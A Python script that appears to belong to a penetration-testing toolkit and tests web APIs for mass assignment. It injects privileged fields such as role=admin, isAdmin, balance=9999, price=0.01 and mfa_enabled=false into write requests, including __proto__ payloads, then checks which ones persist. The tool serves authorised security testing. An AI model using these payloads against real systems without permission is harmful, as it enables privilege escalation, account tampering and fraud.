#!/usr/bin/env python3
"""mass_assign.py - mass-assignment (BOPLA write-side) tester.

For each candidate privileged property, injects it into a create/update
request body in one or more shapes (plain, nested, flattened, __proto__),
sends the write, re-reads the object with GET, and reports which injected
properties PERSISTED (key found anywhere in the read response carrying the
injected value).

Usage:
  python3 scripts/mass_assign.py \
      --url 'https://api.example.com/v1/users/1001' \
      --method PATCH \
      --body base-user.json \
      --read-url 'https://api.example.com/v1/users/1001' \
      --header 'Authorization: Bearer eyJ...A' \
      --props role=admin isAdmin=true balance=9999 \
      --variants plain,flat,proto --nest-key user \
      --out reports/massassign-users.json

Create flows: use --method POST on the collection URL, put '{ID}' in
--read-url, and give --id-field (dot path, e.g. 'data.id') so the new
object's id from the create response is substituted before the re-read.
Values after '=' are parsed as JSON when possible (true, 9999, ["admin"]),
otherwise kept as strings. With no --props, a built-in privileged set is
used. Stdlib only. (vulture / cyan-loom)
"""

import argparse
import json
import os
import ssl
import sys
import tempfile
import urllib.error
import urllib.request

DEFAULT_PROPS = [
    ("role", "admin"), ("roles", ["admin"]), ("isAdmin", True),
    ("is_admin", True), ("admin", True), ("is_staff", True),
    ("is_superuser", True), ("is_verified", True), ("email_verified", True),
    ("verified", True), ("account_id", 1), ("tenant_id", 1), ("org_id", 1),
    ("owner_id", 1), ("balance", 9999), ("credit", 9999),
    ("permissions", ["admin"]), ("groups", ["admin"]), ("plan", "enterprise"),
    ("price", 0.01), ("discount", 100), ("status", "active"),
    ("approved", True), ("enabled", True), ("mfa_enabled", False),
]
ALL_VARIANTS = ("plain", "nested", "flat", "proto")


def parse_value(raw):
    try:
        return json.loads(raw)
    except (ValueError, TypeError):
        return raw


def parse_header_line(line):
    name, _, val = line.partition(":")
    if not val:
        raise ValueError("header must be 'Name: value', got: %r" % line)
    return name.strip(), val.strip()


def build_context(insecure):
    if not insecure:
        return None
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def send(method, url, body_obj, headers, timeout, ctx):
    data = None
    hdrs = dict(headers)
    if body_obj is not None:
        data = json.dumps(body_obj).encode("utf-8")
        hdrs.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=data, method=method)
    for name, val in hdrs.items():
        req.add_header(name, val)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return resp.status, resp.read()
    except urllib.error.HTTPError as err:
        return err.code, err.read()
    except (urllib.error.URLError, OSError) as err:
        return 0, str(err).encode("utf-8")


def inject(base, variant, key, value, nest_key):
    body = json.loads(json.dumps(base))  # deep copy
    if variant == "plain":
        body[key] = value
    elif variant == "nested":
        inner = body.get(nest_key)
        if not isinstance(inner, dict):
            inner = {}
        inner[key] = value
        body[nest_key] = inner
    elif variant == "flat":
        body["%s.%s" % (nest_key, key)] = value
    elif variant == "proto":
        body["__proto__"] = {key: value}
    return body


def find_key_value(obj, key, value):
    """Recursively search parsed JSON for `key` and return its value if the
    key exists anywhere; (found_key, found_value_matches)."""
    found = []

    def walk(node):
        if isinstance(node, dict):
            for k, v in node.items():
                if k == key:
                    found.append(v)
                walk(v)
        elif isinstance(node, list):
            for item in node:
                walk(item)

    walk(obj)
    if not found:
        return False, False
    return True, any(v == value or str(v) == str(value) for v in found)


def dot_get(obj, path):
    cur = obj
    for part in path.split("."):
        if isinstance(cur, dict) and part in cur:
            cur = cur[part]
        elif isinstance(cur, list) and part.isdigit():
            cur = cur[int(part)]
        else:
            return None
    return cur


def atomic_write_json(path, obj):
    directory = os.path.dirname(path) or "."
    os.makedirs(directory, exist_ok=True)
    fd, tmp = tempfile.mkstemp(dir=directory, suffix=".tmp")
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            json.dump(obj, fh, indent=2)
        os.replace(tmp, path)
    except Exception:
        if os.path.exists(tmp):
            os.unlink(tmp)
        raise


def main():
    ap = argparse.ArgumentParser(description="mass-assignment tester")
    ap.add_argument("--url", required=True, help="create/update URL")
    ap.add_argument("--method", default="PATCH",
                    help="POST, PUT or PATCH (default PATCH)")
    ap.add_argument("--body", required=True,
                    help="base JSON body: inline string or a file path")
    ap.add_argument("--read-url", required=True,
                    help="GET URL to re-read the object; may contain '{ID}'")
    ap.add_argument("--id-field", default=None,
                    help="dot path to the object id in the write response, "
                         "substituted into '{ID}' in --read-url")
    ap.add_argument("--header", action="append", default=[],
                    help="header 'Name: value', repeatable (auth here)")
    ap.add_argument("--props", nargs="*", default=None,
                    help="candidate props as key=value (value parsed as "
                         "JSON if possible); default: built-in set")
    ap.add_argument("--variants", default="plain",
                    help="comma list of %s (default plain)"
                         % ",".join(ALL_VARIANTS))
    ap.add_argument("--nest-key", default="user",
                    help="wrapper key for nested/flat variants (default user)")
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--insecure", action="store_true",
                    help="skip TLS certificate verification")
    ap.add_argument("--out", default=None,
                    help="write full JSON results here (atomic)")
    args = ap.parse_args()

    if os.path.isfile(args.body):
        with open(args.body, "r", encoding="utf-8") as fh:
            base_body = json.load(fh)
    else:
        base_body = json.loads(args.body)

    if args.props:
        props = []
        for item in args.props:
            key, _, raw = item.partition("=")
            if not raw:
                ap.error("--props entries must be key=value, got %r" % item)
            props.append((key, parse_value(raw)))
    else:
        props = list(DEFAULT_PROPS)

    variants = [v.strip() for v in args.variants.split(",") if v.strip()]
    for v in variants:
        if v not in ALL_VARIANTS:
            ap.error("unknown variant %r (choose from %s)"
                     % (v, ",".join(ALL_VARIANTS)))

    headers = dict(parse_header_line(h) for h in args.header)
    ctx = build_context(args.insecure)

    results = []
    persisted = []

    print("%-14s %-8s %-6s %-6s %s"
          % ("prop", "variant", "write", "read", "verdict"))
    print("-" * 60)

    for key, value in props:
        for variant in variants:
            body = inject(base_body, variant, key, value, args.nest_key)
            wstatus, wraw = send(args.method, args.url, body, headers,
                                 args.timeout, ctx)

            read_url = args.read_url
            if args.id_field and "{ID}" in read_url:
                try:
                    wjson = json.loads(wraw.decode("utf-8", errors="replace"))
                    oid = dot_get(wjson, args.id_field)
                except ValueError:
                    oid = None
                if oid is None:
                    results.append({"prop": key, "variant": variant,
                                    "write_status": wstatus,
                                    "verdict": "no-id-in-write-response"})
                    print("%-14s %-8s %-6s %-6s %s"
                          % (key, variant, wstatus, "-", "no id extracted"))
                    continue
                read_url = read_url.replace("{ID}", str(oid))

            rstatus, rraw = send("GET", read_url, None, headers,
                                 args.timeout, ctx)
            try:
                rjson = json.loads(rraw.decode("utf-8", errors="replace"))
                key_found, value_matched = find_key_value(rjson, key, value)
            except ValueError:
                key_found, value_matched = False, False

            if value_matched:
                verdict = "PERSISTED"
            elif key_found:
                verdict = "key-present-value-unchanged"
            else:
                verdict = "dropped"

            record = {"prop": key, "value": value, "variant": variant,
                      "write_status": wstatus, "read_status": rstatus,
                      "read_url": read_url, "verdict": verdict,
                      "read_snippet": rraw[:300].decode("utf-8",
                                                        errors="replace")}
            results.append(record)
            if verdict == "PERSISTED":
                persisted.append(record)
            print("%-14s %-8s %-6s %-6s %s"
                  % (key, variant, wstatus, rstatus, verdict))

    print()
    if persisted:
        print("PERSISTED properties (confirm effect, then report per "
              "references/rupu.md):")
        for rec in persisted:
            print("  - %s=%s (%s) via %s %s"
                  % (rec["prop"], json.dumps(rec["value"]), rec["variant"],
                     args.method, args.url))
    else:
        print("no injected property persisted")

    if args.out:
        atomic_write_json(args.out, {
            "tool": "mass_assign",
            "url": args.url,
            "method": args.method,
            "read_url_template": args.read_url,
            "results": results,
            "persisted": persisted,
        })
        print("wrote %s" % args.out)

    return 1 if persisted else 0


if __name__ == "__main__":
    sys.exit(main())
